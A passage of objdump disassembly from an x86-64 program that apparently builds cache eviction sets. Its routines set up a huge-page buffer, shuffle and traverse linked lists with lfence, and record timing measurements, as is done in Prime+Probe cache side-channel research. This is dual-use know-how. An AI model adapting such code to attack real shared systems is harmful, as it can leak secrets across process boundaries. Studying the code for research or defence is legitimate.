    2c4e:	b8 00 00 00 00       	mov    $0x0,%eax
    2c53:	e9 9b 00 00 00       	jmp    2cf3 <list_take+0xcb>
    2c58:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2c5c:	48 8b 00             	mov    (%rax),%rax
    2c5f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2c63:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    2c68:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2c6d:	74 0d                	je     2c7c <list_take+0x54>
    2c6f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2c73:	48 8b 00             	mov    (%rax),%rax
    2c76:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    2c7a:	72 dc                	jb     2c58 <list_take+0x30>
    2c7c:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2c81:	75 07                	jne    2c8a <list_take+0x62>
    2c83:	b8 00 00 00 00       	mov    $0x0,%eax
    2c88:	eb 69                	jmp    2cf3 <list_take+0xcb>
    2c8a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2c8e:	48 8b 00             	mov    (%rax),%rax
    2c91:	48 85 c0             	test   %rax,%rax
    2c94:	74 13                	je     2ca9 <list_take+0x81>
    2c96:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2c9a:	48 8b 00             	mov    (%rax),%rax
    2c9d:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2ca1:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    2ca5:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2ca9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cad:	48 8b 40 08          	mov    0x8(%rax),%rax
    2cb1:	48 85 c0             	test   %rax,%rax
    2cb4:	74 14                	je     2cca <list_take+0xa2>
    2cb6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cba:	48 8b 40 08          	mov    0x8(%rax),%rax
    2cbe:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2cc2:	48 8b 12             	mov    (%rdx),%rdx
    2cc5:	48 89 10             	mov    %rdx,(%rax)
    2cc8:	eb 0e                	jmp    2cd8 <list_take+0xb0>
    2cca:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cce:	48 8b 10             	mov    (%rax),%rdx
    2cd1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2cd5:	48 89 10             	mov    %rdx,(%rax)
    2cd8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cdc:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2ce3:	00 
    2ce4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2ce8:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2cef:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cf3:	5d                   	pop    %rbp
    2cf4:	c3                   	ret

0000000000002cf5 <list_shuffle>:
    2cf5:	55                   	push   %rbp
    2cf6:	48 89 e5             	mov    %rsp,%rbp
    2cf9:	48 83 ec 30          	sub    $0x30,%rsp
    2cfd:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    2d01:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2d05:	48 8b 00             	mov    (%rax),%rax
    2d08:	48 85 c0             	test   %rax,%rax
    2d0b:	0f 84 06 01 00 00    	je     2e17 <list_shuffle+0x122>
    2d11:	bf 08 00 00 00       	mov    $0x8,%edi
    2d16:	e8 c5 e3 ff ff       	call   10e0 <malloc@plt>
    2d1b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    2d1f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2d23:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2d2a:	48 c7 45 e8 ff ff ff 	movq   $0xffffffffffffffff,-0x18(%rbp)
    2d31:	ff 
    2d32:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    2d36:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2d3a:	48 89 d6             	mov    %rdx,%rsi
    2d3d:	48 89 c7             	mov    %rax,%rdi
    2d40:	e8 81 fe ff ff       	call   2bc6 <list_get>
    2d45:	48 8b 05 fc 33 00 00 	mov    0x33fc(%rip),%rax        # 6148 <lfsr>
    2d4c:	48 85 c0             	test   %rax,%rax
    2d4f:	75 60                	jne    2db1 <list_shuffle+0xbc>
    2d51:	e8 0b fa ff ff       	call   2761 <lfsr_create>
    2d56:	48 89 05 eb 33 00 00 	mov    %rax,0x33eb(%rip)        # 6148 <lfsr>
    2d5d:	eb 52                	jmp    2db1 <list_shuffle+0xbc>
    2d5f:	48 8d 05 e2 33 00 00 	lea    0x33e2(%rip),%rax        # 6148 <lfsr>
    2d66:	48 89 c7             	mov    %rax,%rdi
    2d69:	e8 05 fa ff ff       	call   2773 <lfsr_rand>
    2d6e:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    2d72:	48 8d 4e ff          	lea    -0x1(%rsi),%rcx
    2d76:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
    2d7a:	ba 00 00 00 00       	mov    $0x0,%edx
    2d7f:	48 f7 f6             	div    %rsi
    2d82:	48 89 d1             	mov    %rdx,%rcx
    2d85:	48 89 c8             	mov    %rcx,%rax
    2d88:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    2d8c:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
    2d90:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2d94:	48 89 d6             	mov    %rdx,%rsi
    2d97:	48 89 c7             	mov    %rax,%rdi
    2d9a:	e8 89 fe ff ff       	call   2c28 <list_take>
    2d9f:	48 89 c2             	mov    %rax,%rdx
    2da2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2da6:	48 89 d6             	mov    %rdx,%rsi
    2da9:	48 89 c7             	mov    %rax,%rdi
    2dac:	e8 e3 fc ff ff       	call   2a94 <list_append>
    2db1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2db5:	48 85 c0             	test   %rax,%rax
    2db8:	75 a5                	jne    2d5f <list_shuffle+0x6a>
    2dba:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2dbe:	48 8b 00             	mov    (%rax),%rax
    2dc1:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2dc5:	eb 17                	jmp    2dde <list_shuffle+0xe9>
    2dc7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2dcb:	48 89 c7             	mov    %rax,%rdi
    2dce:	e8 7d f8 ff ff       	call   2650 <my_access>
    2dd3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2dd7:	48 8b 00             	mov    (%rax),%rax
    2dda:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2dde:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2de2:	48 8b 00             	mov    (%rax),%rax
    2de5:	48 85 c0             	test   %rax,%rax
    2de8:	75 dd                	jne    2dc7 <list_shuffle+0xd2>
    2dea:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2dee:	48 8b 10             	mov    (%rax),%rdx
    2df1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2df5:	48 89 10             	mov    %rdx,(%rax)
    2df8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2dfc:	48 8b 00             	mov    (%rax),%rax
    2dff:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2e03:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2e07:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2e0b:	48 8b 10             	mov    (%rax),%rdx
    2e0e:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2e12:	48 89 10             	mov    %rdx,(%rax)
    2e15:	eb 01                	jmp    2e18 <list_shuffle+0x123>
    2e17:	90                   	nop
    2e18:	c9                   	leave
    2e19:	c3                   	ret

0000000000002e1a <list_print>:
    2e1a:	55                   	push   %rbp
    2e1b:	48 89 e5             	mov    %rsp,%rbp
    2e1e:	48 83 ec 20          	sub    $0x20,%rsp
    2e22:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2e26:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    2e2b:	74 7f                	je     2eac <list_print+0x92>
    2e2d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2e31:	48 8b 00             	mov    (%rax),%rax
    2e34:	48 85 c0             	test   %rax,%rax
    2e37:	74 76                	je     2eaf <list_print+0x95>
    2e39:	48 8d 05 50 13 00 00 	lea    0x1350(%rip),%rax        # 4190 <_IO_stdin_used+0x190>
    2e40:	48 89 c7             	mov    %rax,%rdi
    2e43:	e8 f8 e1 ff ff       	call   1040 <puts@plt>
    2e48:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    2e4f:	00 
    2e50:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2e54:	48 8b 00             	mov    (%rax),%rax
    2e57:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2e5b:	eb 46                	jmp    2ea3 <list_print+0x89>
    2e5d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2e61:	48 8b 08             	mov    (%rax),%rcx
    2e64:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    2e69:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2e6d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2e71:	48 89 c6             	mov    %rax,%rsi
    2e74:	48 8d 05 30 13 00 00 	lea    0x1330(%rip),%rax        # 41ab <_IO_stdin_used+0x1ab>
    2e7b:	48 89 c7             	mov    %rax,%rdi
    2e7e:	b8 00 00 00 00       	mov    $0x0,%eax
    2e83:	e8 08 e2 ff ff       	call   1090 <printf@plt>
    2e88:	48 8b 05 91 32 00 00 	mov    0x3291(%rip),%rax        # 6120 <conf>
    2e8f:	48 8b 00             	mov    (%rax),%rax
    2e92:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    2e96:	73 1a                	jae    2eb2 <list_print+0x98>
    2e98:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2e9c:	48 8b 00             	mov    (%rax),%rax
    2e9f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2ea3:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2ea8:	75 b3                	jne    2e5d <list_print+0x43>
    2eaa:	eb 07                	jmp    2eb3 <list_print+0x99>
    2eac:	90                   	nop
    2ead:	eb 04                	jmp    2eb3 <list_print+0x99>
    2eaf:	90                   	nop
    2eb0:	eb 01                	jmp    2eb3 <list_print+0x99>
    2eb2:	90                   	nop
    2eb3:	c9                   	leave
    2eb4:	c3                   	ret

0000000000002eb5 <init_evset>:
    2eb5:	55                   	push   %rbp
    2eb6:	48 89 e5             	mov    %rsp,%rbp
    2eb9:	48 83 ec 10          	sub    $0x10,%rsp
    2ebd:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2ec1:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
    2ec6:	e8 47 f8 ff ff       	call   2712 <wait>
    2ecb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2ecf:	48 89 05 4a 32 00 00 	mov    %rax,0x324a(%rip)        # 6120 <conf>
    2ed6:	48 c7 05 57 32 00 00 	movq   $0x400000,0x3257(%rip)        # 6138 <buffer_size>
    2edd:	00 00 40 00 
    2ee1:	48 8b 05 50 32 00 00 	mov    0x3250(%rip),%rax        # 6138 <buffer_size>
    2ee8:	41 b9 00 00 00 00    	mov    $0x0,%r9d
    2eee:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
    2ef4:	b9 22 00 04 00       	mov    $0x40022,%ecx
    2ef9:	ba 03 00 00 00       	mov    $0x3,%edx
    2efe:	48 89 c6             	mov    %rax,%rsi
    2f01:	bf 00 00 00 00       	mov    $0x0,%edi
    2f06:	e8 75 e1 ff ff       	call   1080 <mmap@plt>
    2f0b:	48 89 05 1e 32 00 00 	mov    %rax,0x321e(%rip)        # 6130 <buffer>
    2f12:	48 8b 05 17 32 00 00 	mov    0x3217(%rip),%rax        # 6130 <buffer>
    2f19:	ba 0e 00 00 00       	mov    $0xe,%edx
    2f1e:	be 00 00 20 00       	mov    $0x200000,%esi
    2f23:	48 89 c7             	mov    %rax,%rdi
    2f26:	e8 e5 e1 ff ff       	call   1110 <madvise@plt>
    2f2b:	83 f8 ff             	cmp    $0xffffffff,%eax
    2f2e:	75 14                	jne    2f44 <init_evset+0x8f>
    2f30:	48 8d 05 81 12 00 00 	lea    0x1281(%rip),%rax        # 41b8 <_IO_stdin_used+0x1b8>
    2f37:	48 89 c7             	mov    %rax,%rdi
    2f3a:	e8 01 e1 ff ff       	call   1040 <puts@plt>
    2f3f:	e9 85 00 00 00       	jmp    2fc9 <init_evset+0x114>
    2f44:	48 8d 05 e5 31 00 00 	lea    0x31e5(%rip),%rax        # 6130 <buffer>
    2f4b:	48 89 05 ee 31 00 00 	mov    %rax,0x31ee(%rip)        # 6140 <buffer_ptr>
    2f52:	48 8b 15 df 31 00 00 	mov    0x31df(%rip),%rdx        # 6138 <buffer_size>
    2f59:	48 8b 05 d0 31 00 00 	mov    0x31d0(%rip),%rax        # 6130 <buffer>
    2f60:	48 89 d6             	mov    %rdx,%rsi
    2f63:	48 89 c7             	mov    %rax,%rdi
    2f66:	e8 55 f9 ff ff       	call   28c0 <list_init>
    2f6b:	48 8b 05 ae 31 00 00 	mov    0x31ae(%rip),%rax        # 6120 <conf>
    2f72:	48 8b 00             	mov    (%rax),%rax
    2f75:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    2f7c:	00 
    2f7d:	48 8b 05 a4 31 00 00 	mov    0x31a4(%rip),%rax        # 6128 <evsets>
    2f84:	48 89 d6             	mov    %rdx,%rsi
    2f87:	48 89 c7             	mov    %rax,%rdi
    2f8a:	e8 61 e1 ff ff       	call   10f0 <realloc@plt>
    2f8f:	48 89 05 92 31 00 00 	mov    %rax,0x3192(%rip)        # 6128 <evsets>
    2f96:	48 8b 05 8b 31 00 00 	mov    0x318b(%rip),%rax        # 6128 <evsets>
    2f9d:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2fa4:	48 8b 15 85 31 00 00 	mov    0x3185(%rip),%rdx        # 6130 <buffer>
    2fab:	48 8b 05 76 31 00 00 	mov    0x3176(%rip),%rax        # 6128 <evsets>
    2fb2:	48 89 c6             	mov    %rax,%rsi
    2fb5:	48 8d 05 0c 12 00 00 	lea    0x120c(%rip),%rax        # 41c8 <_IO_stdin_used+0x1c8>
    2fbc:	48 89 c7             	mov    %rax,%rdi
    2fbf:	b8 00 00 00 00       	mov    $0x0,%eax
    2fc4:	e8 c7 e0 ff ff       	call   1090 <printf@plt>
    2fc9:	c9                   	leave
    2fca:	c3                   	ret

0000000000002fcb <find_evset>:
    2fcb:	55                   	push   %rbp
    2fcc:	48 89 e5             	mov    %rsp,%rbp
    2fcf:	48 83 ec 30          	sub    $0x30,%rsp
    2fd3:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    2fd7:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
    2fdb:	48 8b 05 76 31 00 00 	mov    0x3176(%rip),%rax        # 6158 <msrmts>
    2fe2:	48 85 c0             	test   %rax,%rax
    2fe5:	74 1a                	je     3001 <find_evset+0x36>
    2fe7:	48 8b 05 6a 31 00 00 	mov    0x316a(%rip),%rax        # 6158 <msrmts>
    2fee:	48 89 c7             	mov    %rax,%rdi
    2ff1:	e8 3a e0 ff ff       	call   1030 <free@plt>
    2ff6:	48 c7 05 57 31 00 00 	movq   $0x0,0x3157(%rip)        # 6158 <msrmts>
    2ffd:	00 00 00 00 
    3001:	48 8b 05 50 31 00 00 	mov    0x3150(%rip),%rax        # 6158 <msrmts>
    3008:	be 40 1f 00 00       	mov    $0x1f40,%esi
    300d:	48 89 c7             	mov    %rax,%rdi
    3010:	e8 db e0 ff ff       	call   10f0 <realloc@plt>
    3015:	48 89 05 3c 31 00 00 	mov    %rax,0x313c(%rip)        # 6158 <msrmts>
    301c:	48 8d 05 d4 11 00 00 	lea    0x11d4(%rip),%rax        # 41f7 <_IO_stdin_used+0x1f7>
    3023:	48 89 c7             	mov    %rax,%rdi
    3026:	e8 15 e0 ff ff       	call   1040 <puts@plt>
    302b:	48 8b 05 fe 30 00 00 	mov    0x30fe(%rip),%rax        # 6130 <buffer>
    3032:	48 85 c0             	test   %rax,%rax
    3035:	74 0c                	je     3043 <find_evset+0x78>
    3037:	48 8b 05 ea 30 00 00 	mov    0x30ea(%rip),%rax        # 6128 <evsets>
    303e:	48 85 c0             	test   %rax,%rax
    3041:	75 25                	jne    3068 <find_evset+0x9d>
    3043:	48 8d 05 af 11 00 00 	lea    0x11af(%rip),%rax        # 41f9 <_IO_stdin_used+0x1f9>
    304a:	48 89 c7             	mov    %rax,%rdi
    304d:	e8 ee df ff ff       	call   1040 <puts@plt>
    3052:	b8 00 00 00 00       	mov    $0x0,%eax
    3057:	e8 e3 01 00 00       	call   323f <close_evsets>
    305c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    3060:	48 89 c7             	mov    %rax,%rdi
    3063:	e8 4d fe ff ff       	call   2eb5 <init_evset>
    3068:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
    306d:	e8 a0 f6 ff ff       	call   2712 <wait>
    3072:	48 8d 05 7e 11 00 00 	lea    0x117e(%rip),%rax        # 41f7 <_IO_stdin_used+0x1f7>
    3079:	48 89 c7             	mov    %rax,%rdi
    307c:	e8 bf df ff ff       	call   1040 <puts@plt>
    3081:	c7 45 fc ff 07 00 00 	movl   $0x7ff,-0x4(%rbp)
    3088:	e9 38 01 00 00       	jmp    31c5 <find_evset+0x1fa>
    308d:	48 8d 05 77 11 00 00 	lea    0x1177(%rip),%rax        # 420b <_IO_stdin_used+0x20b>
    3094:	48 89 c7             	mov    %rax,%rdi
    3097:	e8 a4 df ff ff       	call   1040 <puts@plt>
    309c:	48 8b 05 7d 30 00 00 	mov    0x307d(%rip),%rax        # 6120 <conf>
    30a3:	48 8b 00             	mov    (%rax),%rax
    30a6:	83 e8 01             	sub    $0x1,%eax
    30a9:	89 45 f8             	mov    %eax,-0x8(%rbp)
    30ac:	eb 5b                	jmp    3109 <find_evset+0x13e>
    30ae:	8b 45 fc             	mov    -0x4(%rbp),%eax
    30b1:	48 98                	cltq
    30b3:	8b 55 f8             	mov    -0x8(%rbp),%edx
    30b6:	48 63 d2             	movslq %edx,%rdx
    30b9:	48 c1 e2 0b          	shl    $0xb,%rdx
    30bd:	48 01 c2             	add    %rax,%rdx
    30c0:	b8 ff 07 00 00       	mov    $0x7ff,%eax
    30c5:	2b 45 fc             	sub    -0x4(%rbp),%eax
    30c8:	0f af 45 f8          	imul   -0x8(%rbp),%eax
    30cc:	48 98                	cltq
    30ce:	48 29 c2             	sub    %rax,%rdx
    30d1:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    30d5:	48 8b 05 64 30 00 00 	mov    0x3064(%rip),%rax        # 6140 <buffer_ptr>
    30dc:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    30e0:	48 89 d6             	mov    %rdx,%rsi
    30e3:	48 89 c7             	mov    %rax,%rdi
    30e6:	e8 3d fb ff ff       	call   2c28 <list_take>
    30eb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    30ef:	48 8b 05 32 30 00 00 	mov    0x3032(%rip),%rax        # 6128 <evsets>
    30f6:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    30fa:	48 89 d6             	mov    %rdx,%rsi
    30fd:	48 89 c7             	mov    %rax,%rdi
    3100:	e8 8f f9 ff ff       	call   2a94 <list_append>
    3105:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
    3109:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
    310d:	79 9f                	jns    30ae <find_evset+0xe3>
    310f:	48 8d 05 f7 10 00 00 	lea    0x10f7(%rip),%rax        # 420d <_IO_stdin_used+0x20d>
    3116:	48 89 c7             	mov    %rax,%rdi
    3119:	e8 22 df ff ff       	call   1040 <puts@plt>
    311e:	48 8b 05 03 30 00 00 	mov    0x3003(%rip),%rax        # 6128 <evsets>
    3125:	48 89 c7             	mov    %rax,%rdi
    3128:	e8 c8 fb ff ff       	call   2cf5 <list_shuffle>
    312d:	48 8d 05 db 10 00 00 	lea    0x10db(%rip),%rax        # 420f <_IO_stdin_used+0x20f>
    3134:	48 89 c7             	mov    %rax,%rdi
    3137:	e8 04 df ff ff       	call   1040 <puts@plt>
    313c:	48 8b 05 0d 30 00 00 	mov    0x300d(%rip),%rax        # 6150 <msr_index>
    3143:	48 3d de 03 00 00    	cmp    $0x3de,%rax
    3149:	76 0b                	jbe    3156 <find_evset+0x18b>
    314b:	48 c7 05 fa 2f 00 00 	movq   $0x0,0x2ffa(%rip)        # 6150 <msr_index>
    3152:	00 00 00 00 
    3156:	48 8d 05 b4 10 00 00 	lea    0x10b4(%rip),%rax        # 4211 <_IO_stdin_used+0x211>
    315d:	48 89 c7             	mov    %rax,%rdi
    3160:	e8 db de ff ff       	call   1040 <puts@plt>
    3165:	48 8b 05 bc 2f 00 00 	mov    0x2fbc(%rip),%rax        # 6128 <evsets>
    316c:	48 8b 00             	mov    (%rax),%rax
    316f:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    3173:	48 89 d6             	mov    %rdx,%rsi
    3176:	48 89 c7             	mov    %rax,%rdi
    3179:	e8 31 02 00 00       	call   33af <test>
    317e:	48 85 c0             	test   %rax,%rax
    3181:	74 2f                	je     31b2 <find_evset+0x1e7>
    3183:	48 8b 05 9e 2f 00 00 	mov    0x2f9e(%rip),%rax        # 6128 <evsets>
    318a:	48 8b 00             	mov    (%rax),%rax
    318d:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    3191:	48 89 d6             	mov    %rdx,%rsi
    3194:	48 89 c7             	mov    %rax,%rdi
    3197:	e8 13 02 00 00       	call   33af <test>
    319c:	48 85 c0             	test   %rax,%rax
    319f:	75 30                	jne    31d1 <find_evset+0x206>
    31a1:	eb 0f                	jmp    31b2 <find_evset+0x1e7>
    31a3:	48 8b 05 7e 2f 00 00 	mov    0x2f7e(%rip),%rax        # 6128 <evsets>
    31aa:	48 89 c7             	mov    %rax,%rdi
    31ad:	e8 9f f9 ff ff       	call   2b51 <list_pop>
    31b2:	48 8b 05 6f 2f 00 00 	mov    0x2f6f(%rip),%rax        # 6128 <evsets>
    31b9:	48 8b 00             	mov    (%rax),%rax
    31bc:	48 85 c0             	test   %rax,%rax
    31bf:	75 e2                	jne    31a3 <find_evset+0x1d8>
    31c1:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
    31c5:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
    31c9:	0f 89 be fe ff ff    	jns    308d <find_evset+0xc2>
    31cf:	eb 01                	jmp    31d2 <find_evset+0x207>
    31d1:	90                   	nop
    31d2:	48 8d 05 1e 10 00 00 	lea    0x101e(%rip),%rax        # 41f7 <_IO_stdin_used+0x1f7>
    31d9:	48 89 c7             	mov    %rax,%rdi
    31dc:	e8 5f de ff ff       	call   1040 <puts@plt>
    31e1:	48 8b 05 40 2f 00 00 	mov    0x2f40(%rip),%rax        # 6128 <evsets>
    31e8:	c9                   	leave
    31e9:	c3                   	ret

00000000000031ea <del_evset>:
    31ea:	55                   	push   %rbp
    31eb:	48 89 e5             	mov    %rsp,%rbp
    31ee:	48 8b 05 33 2f 00 00 	mov    0x2f33(%rip),%rax        # 6128 <evsets>
    31f5:	48 85 c0             	test   %rax,%rax
    31f8:	74 22                	je     321c <del_evset+0x32>
    31fa:	eb 0f                	jmp    320b <del_evset+0x21>
    31fc:	48 8b 05 25 2f 00 00 	mov    0x2f25(%rip),%rax        # 6128 <evsets>
    3203:	48 89 c7             	mov    %rax,%rdi
    3206:	e8 46 f9 ff ff       	call   2b51 <list_pop>
    320b:	48 8b 05 16 2f 00 00 	mov    0x2f16(%rip),%rax        # 6128 <evsets>
    3212:	48 8b 00             	mov    (%rax),%rax
    3215:	48 85 c0             	test   %rax,%rax
    3218:	75 e2                	jne    31fc <del_evset+0x12>
    321a:	eb 01                	jmp    321d <del_evset+0x33>
    321c:	90                   	nop
    321d:	5d                   	pop    %rbp
    321e:	c3                   	ret

000000000000321f <get_evset>:
    321f:	55                   	push   %rbp
    3220:	48 89 e5             	mov    %rsp,%rbp
    3223:	48 8b 05 fe 2e 00 00 	mov    0x2efe(%rip),%rax        # 6128 <evsets>
    322a:	48 85 c0             	test   %rax,%rax
    322d:	75 07                	jne    3236 <get_evset+0x17>
    322f:	b8 00 00 00 00       	mov    $0x0,%eax
    3234:	eb 07                	jmp    323d <get_evset+0x1e>
    3236:	48 8b 05 eb 2e 00 00 	mov    0x2eeb(%rip),%rax        # 6128 <evsets>
    323d:	5d                   	pop    %rbp
    323e:	c3                   	ret

000000000000323f <close_evsets>:
    323f:	55                   	push   %rbp
    3240:	48 89 e5             	mov    %rsp,%rbp
    3243:	48 8b 05 de 2e 00 00 	mov    0x2ede(%rip),%rax        # 6128 <evsets>
    324a:	48 85 c0             	test   %rax,%rax
    324d:	74 1a                	je     3269 <close_evsets+0x2a>
    324f:	48 8b 05 d2 2e 00 00 	mov    0x2ed2(%rip),%rax        # 6128 <evsets>
    3256:	48 89 c7             	mov    %rax,%rdi
    3259:	e8 d2 dd ff ff       	call   1030 <free@plt>
    325e:	48 c7 05 bf 2e 00 00 	movq   $0x0,0x2ebf(%rip)        # 6128 <evsets>
    3265:	00 00 00 00 
    3269:	48 8b 05 c0 2e 00 00 	mov    0x2ec0(%rip),%rax        # 6130 <buffer>
    3270:	48 85 c0             	test   %rax,%rax
    3273:	74 19                	je     328e <close_evsets+0x4f>
    3275:	48 8b 15 bc 2e 00 00 	mov    0x2ebc(%rip),%rdx        # 6138 <buffer_size>
    327c:	48 8b 05 ad 2e 00 00 	mov    0x2ead(%rip),%rax        # 6130 <buffer>
    3283:	48 89 d6             	mov    %rdx,%rsi
    3286:	48 89 c7             	mov    %rax,%rdi
    3289:	e8 72 de ff ff       	call   1100 <munmap@plt>
    328e:	48 8b 05 8b 2e 00 00 	mov    0x2e8b(%rip),%rax        # 6120 <conf>
    3295:	48 85 c0             	test   %rax,%rax
    3298:	74 1a                	je     32b4 <close_evsets+0x75>
    329a:	48 8b 05 7f 2e 00 00 	mov    0x2e7f(%rip),%rax        # 6120 <conf>
    32a1:	48 89 c7             	mov    %rax,%rdi
    32a4:	e8 87 dd ff ff       	call   1030 <free@plt>
    32a9:	48 c7 05 6c 2e 00 00 	movq   $0x0,0x2e6c(%rip)        # 6120 <conf>
    32b0:	00 00 00 00 
    32b4:	90                   	nop
    32b5:	5d                   	pop    %rbp
    32b6:	c3                   	ret

00000000000032b7 <traverse_list0>:
    32b7:	55                   	push   %rbp
    32b8:	48 89 e5             	mov    %rsp,%rbp
    32bb:	48 83 ec 18          	sub    $0x18,%rsp
    32bf:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    32c3:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    32ca:	00 
    32cb:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    32cf:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    32d3:	eb 1a                	jmp    32ef <traverse_list0+0x38>
    32d5:	0f ae e8             	lfence
    32d8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    32dc:	48 89 c7             	mov    %rax,%rdi
    32df:	e8 6c f3 ff ff       	call   2650 <my_access>
    32e4:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    32e8:	48 8b 00             	mov    (%rax),%rax
    32eb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    32ef:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    32f3:	48 8d 50 01          	lea    0x1(%rax),%rdx
    32f7:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
    32fb:	48 8b 15 1e 2e 00 00 	mov    0x2e1e(%rip),%rdx        # 6120 <conf>
    3302:	48 8b 12             	mov    (%rdx),%rdx
    3305:	48 39 d0             	cmp    %rdx,%rax
    3308:	72 cb                	jb     32d5 <traverse_list0+0x1e>
    330a:	90                   	nop
    330b:	90                   	nop
    330c:	c9                   	leave
    330d:	c3                   	ret

000000000000330e <test_intern>:
    330e:	55                   	push   %rbp
    330f:	48 89 e5             	mov    %rsp,%rbp
    3312:	53                   	push   %rbx
    3313:	48 83 ec 18          	sub    $0x18,%rsp
    3317:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    331b:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    331f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3323:	48 89 c7             	mov    %rax,%rdi
    3326:	e8 25 f3 ff ff       	call   2650 <my_access>
    332b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    332f:	48 89 c7             	mov    %rax,%rdi
    3332:	e8 80 ff ff ff       	call   32b7 <traverse_list0>
    3337:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    333b:	48 05 de 00 00 00    	add    $0xde,%rax
    3341:	48 89 c7             	mov    %rax,%rdi
    3344:	e8 07 f3 ff ff       	call   2650 <my_access>
    3349:	48 8b 0d 08 2e 00 00 	mov    0x2e08(%rip),%rcx        # 6158 <msrmts>
    3350:	48 8b 05 f9 2d 00 00 	mov    0x2df9(%rip),%rax        # 6150 <msr_index>
    3357:	48 8d 50 01          	lea    0x1(%rax),%rdx
    335b:	48 89 15 ee 2d 00 00 	mov    %rdx,0x2dee(%rip)        # 6150 <msr_index>
